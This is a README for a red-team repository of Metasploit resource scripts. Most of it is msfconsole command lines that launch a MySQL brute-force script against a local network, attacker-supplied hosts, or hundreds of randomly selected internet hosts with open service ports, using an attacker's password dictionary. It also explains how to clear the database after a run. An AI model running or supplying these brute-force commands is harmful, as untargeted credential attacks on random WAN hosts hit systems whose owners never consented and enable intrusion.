## METASPLOIT RESOURCE FILES

<blockquote>Resource scripts provides an easy way for us to automate repetitive tasks in Metasploit. Conceptually they're just like batch scripts, they contain a set of commands that are automatically and sequentially executed when you load the script in Metasploit. You can create a resource script by chaining together a series of Metasploit console commands or by directly embedding Ruby to do things like call APIs, interact with objects in the database, modules and iterate actions.</blockquote>

![pic](http://i68.tinypic.com/21ovkfm.jpg)

<br />

**This repository contains various resource files to assiste in exploitation or metasploit database related issues.**
#### [!] [Please read the article about rc scripting here:](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

<br /><br /><br />

### USING 'SETG' GLOBAL VARIABLES TO CONFIG RC SCRIPTS

![pic](http://i67.tinypic.com/2wfi88h.png)

> Many of the this brute force rc scripts are written to accept user inputs (setg global variables).<br />
> This means that users can run the resource scripts in 3 diferent ways:

- execute resource script (default).<br />
**[ Local lan scan: 192.168.1.0/24 ]**

      msfconsole -r /root/mysql_brute.rc

- instruct the resource script to scan rhosts input by attacker<br />
**[ Attacker input scan: 10.10.10.1 10.10.11.2 ]**

      msfconsole -q -x 'setg RHOSTS 10.10.10.1 10.10.11.2;resource /root/mysql_brute.rc'

- instruct the resource script to search in WAN for rhosts with service port open<br />
**[ Random scan: WAN for rhosts ]**

      msfconsole -q -x 'setg RANDOM_HOSTS true;resource /root/mysql_brute.rc'

<br /><br /><br />

> Adicionally to the described settings we can also combine diferent configurations at runtime.

- instruct the resource script to search in WAN for rhosts with service port open and limmit the search to 300 rhosts

      msfconsole -q -x 'setg RANDOM_HOSTS true;setg RANDOM 300;resource /root/mysql_brute.rc'

- instruct the resource script to use attackers dicionary file (absoluct path required)

      msfconsole -q -x 'setg USERPASS_FILE /root/dicionary.txt;resource /root/mysql_brute.rc'

- instruct the resource script to scan rhosts input by attacker, and use the attacker dicionary file 

      msfconsole -q -x 'setg RHOSTS 10.10.10.1 10.10.11.2;setg USERPASS_FILE /root/dicionary.txt;resource /root/mysql_brute.rc'

- instruct the resource script to not clean database at exit scan WAN for rhosts and limmit search to 600 rhosts

      msfconsole -q -x 'setg CLEAN false;setg RANDOM_HOSTS true;setg RANDOM 600;resource /root/mysql_brute.rc'

<br /><br /><br />

#### FINAL NOTES:

- The msfconsole database must be empty (**clean**) at resource script execution.<br />
`msfconsole -q -x 'hosts -d;services -d;exit -y'`<br />
**The best technic to use brute force scripts is to:**<br />
`msfconsole -q -x 'hosts -d;services -d;resource /root/<resource_script_name>.rc`<br /><br />
- Brute force resource scripts will build one logfile in /root directory.<br />
`/root/<resource_script_name>.log`<br /><br />
- Brute force resource scripts deletes msfconsole database at exit (default).<br />
`msfconsole -q -x 'setg CLEAN false;resource /root/<resource_script_name>.rc'`<br />
**The above command instruct the rc script to not delete database at exit**<br /><br />

### Suspicious Shell Activity RedTeam @2019

<br />

